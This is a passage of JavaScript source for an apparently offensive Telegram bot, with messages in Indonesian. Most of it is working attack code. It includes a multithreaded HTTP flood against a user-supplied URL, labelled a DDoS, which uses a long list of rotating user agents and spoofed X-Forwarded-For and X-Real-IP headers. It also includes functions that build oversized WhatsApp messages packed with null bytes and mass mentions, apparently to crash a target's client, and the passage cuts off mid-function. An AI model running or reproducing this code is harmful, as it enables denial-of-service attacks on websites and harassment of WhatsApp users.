    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.34',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.42',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.52',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.61',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.72',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0 (Edition std-1)',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0 (Edition Yx 08)',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0 (Edition Yx GX)',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 YaBrowser/22.11.0.2419 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 YaBrowser/22.11.0.2424 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.181 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.26',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.35',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.42',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.52',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.56',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 OPR/93.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Viewer/97.9.5538.39',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.110 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.18 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.71 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.122 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4539.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36 Edg/96.0.1054.43',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.55',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/99.0.1150.39',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.106.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.107.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.107.0.0 Safari/537.36 Edg/99.107.1418.24',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko, Foregenix) Chrome/91.0.4472.77 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.143 YaBrowser/22.5.0.1816 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaBrowser/22.9.1.1096 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 OPR/91.0.4516.77 (Edition Yx)',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 YaBrowser/19.10.3.281 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 Core/1.94.175.400 QQBrowser/11.1.5155.400',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36 Core/1.94.186.400 QQBrowser/11.3.5195.400',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.33',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.168 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.56',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36 Puffin/9.0.1.982WD',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0',
    'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edg/106.0.1370.52',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0 (Edition Yx 05)',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh_CN) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0 baidubrowser/1.x Safari/534.7',
    'Mozilla/5.0 (X11; CrOS aarch64 14526.69.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.82 Safari/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 14989.107.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 15054.114.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 15117.111.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 15117.112.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 15117.86.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 15117.87.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 15183.38.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',
    'Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/67.0.3396.99 Chrome/67.0.3396.99 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36 OPR/89.0.4447.38',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.101 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.114 YaBrowser/22.9.1.1110 (beta) Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.124 YaBrowser/22.9.3.894 Yowser/2.5 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 OPR/92.0.0.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.35',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.42',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.43',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 OPR/93.0.0.0',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 OPR/93.0.0.0 (Edition beta)',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) QtWebEngine/5.15.2 Chrome/83.0.4103.122 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/65.0.3325.181 Chrome/65.0.3325.181 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/602.1 (KHTML, like Gecko) splash Version/10.0 Safari/602.1',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0',
    'Opera/9.80 (Android; Opera Mini/7.6.40234/191.278; U; ru) Presto/2.12.423 Version/12.16'  
            ],
            methods: ["GET", "POST", "HEAD", "OPTIONS"]
        };

        let totalRequests = 0;
        let successfulAttacks = 0;
        const startTime = Date.now();
        const attackPromises = [];

        // Engine Loop
        for (let i = 0; i < attackConfig.threads; i++) {
            attackPromises.push(new Promise(async (resolve) => {
                let threadRequests = 0;
                
                while (Date.now() - startTime < attackConfig.duration && threadRequests < attackConfig.requestsPerThread) {
                    try {
                        const method = attackConfig.methods[Math.floor(Math.random() * attackConfig.methods.length)];
                        const userAgent = attackConfig.userAgents[Math.floor(Math.random() * attackConfig.userAgents.length)];
                        const ip = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;

                        const headers = {
                            "X-Forwarded-For": ip,
                            "X-Real-IP": ip,
                            "User-Agent": userAgent,
                            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                            "Accept-Language": "en-US,en;q=0.5",
                            "Connection": "keep-alive",
                            "Cache-Control": "no-cache"
                        };

                        const randomPaths = ["/", "/admin", "/api", "/login", "/test"];
                        const randomPath = randomPaths[Math.floor(Math.random() * randomPaths.length)];
                        const attackUrl = target_url.endsWith('/') ? target_url + randomPath.substring(1) : target_url + randomPath;

                        const response = await axios({
                            method: method,
                            url: attackUrl,
                            headers: headers,
                            timeout: 5000,
                            validateStatus: () => true
                        });

                        totalRequests++;
                        threadRequests++;
                        
                        if (response.status < 500) {
                            successfulAttacks++;
                        }

                        // Update Status setiap 100 request
                        if (totalRequests % 100 === 0) {
                            const elapsed = Math.floor((Date.now() - startTime) / 1000);
                            await ctx.telegram.editMessageText(
                                ctx.chat.id,
                                processMsg.message_id,
                                null,
                                `<blockquote><strong>
⬡═―—⊱ ⎧ 『 Vïðñïx Inv¡cťús』⊰―—═⬡
✧ - Target
☇ - ${target_url}
✧ - Threads
☇ - ${attackConfig.threads}
✧ - Requests
☇ - ${totalRequests}
✧ - Success
☇ - ${successfulAttacks}
✧ - Duration
☇ - ${elapsed}s
✧ - Status
☇ - Running
</strong></blockquote>`,
                                { parse_mode: "HTML" }
                            ).catch(() => {});
                        }

                        await new Promise(r => setTimeout(r, Math.random() * 50));

                    } catch (error) {
                        threadRequests++;
                        totalRequests++;
                    }
                }
                resolve();
            }));
        }

        await Promise.all(attackPromises);

        // Final Report
        const endTime = Date.now();
        const totalDuration = Math.floor((endTime - startTime) / 1000) || 1;

        await ctx.telegram.editMessageText(
            ctx.chat.id,
            processMsg.message_id,
            null,
            `<blockquote><strong>
⬡═―—⊱ ⎧ 『 Vïðñïx Inv¡cťús』⊰―—═⬡
✧ - Target
☇ - ${target_url}
✧ - Threads
☇ - ${attackConfig.threads}
✧ - Total Requests
☇ - ${totalRequests}
✧ - Successful
☇ - ${successfulAttacks}
✧ - Total Duration
☇ - ${totalDuration}s
✧ - Requests/Sec
☇ - ${Math.floor(totalRequests / totalDuration)}
✧ - Status
☇ - Completed
</strong></blockquote>`,
            { parse_mode: "HTML" }
        ).catch(() => {});

    } catch (error) {
        console.error(error);
        ctx.reply("❌ ☇ Gagal melakukan serangan ddos");
    }
});       
////////// OWNER MENU \\\\\\\\\
bot.command("Status", checkOwner, checkAdmin, async (ctx) => {
  try {
    const waStatus = sock && sock.user
      ? "✅ Terhubung"
      : "❌ Tidak Terhubung";

    const message = `
<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃ STATUS WHATSAPP
┣━━━━━━━━━━━━━━━━━━━━
┃ ⌬ STATUS : ${waStatus}
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>
`;

    await ctx.reply(message, {
      parse_mode: "HTML"
    });

  } catch (error) {
    console.error("Gagal menampilkan status bot:", error);
    ctx.reply("❌ Gagal menampilkan status bot.");
  }
});
/////////////////START FUNC/////////////////////////
async function AS(sock, target) {
    let vnxdlymbg = await generateWAMessageFromContent(
       target,
       {
        interactiveResponseMessage: {
          contextInfo: {
            urlTrackingMap: {
            urlTrackingMapElements: Array.from({ length: 10000 }, () => ({
              "\0": "\u0000".repeat(250000)
            }))
           },
           body: {
             text: "VnX"
          },
          footer: {
            text: "\u0000".repeat(250000)
           },
           nativeFlowResponseMessage: {
             name: "galaxy_message",
             paramsJson: `{\"flow_cta\":{\"title\":${"\u0000".repeat(250000)}}}`,
             version: 3
             } 
           } 
        }
     },
    { userJid: sock.user.id, quoted: null }
  );

    await sock.relayMessage(
        "status@broadcast",
        vnxdlymbg.message,
        {
            messageId: vnxdlymbg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: undefined
                                }
                            ]
                        }
                    ]
                }
            ]
        }
    );
}

async function King(sock, target) {
  const Stanza_Id = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: " [ KENZY ] ", 
            format: "EXTENTION_1" 
          },
          contextInfo: {
            mentionedJid: Array.from({ length: 2000 }, (_, i) => `1313555020${i + 1}@s.whatsapp.net`),
            statusAttributionType: "SHARED_FROM_MENTION"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "galaxy_message"
        }
      }
    }
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 9741,
    isForwarded: true,
    font: Math.floor(Math.random() * 99999999),
    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
  })

  await sock.relayMessage("status@broadcast", Stanza_Id.message, {
    messageId: Stanza_Id.key.id,
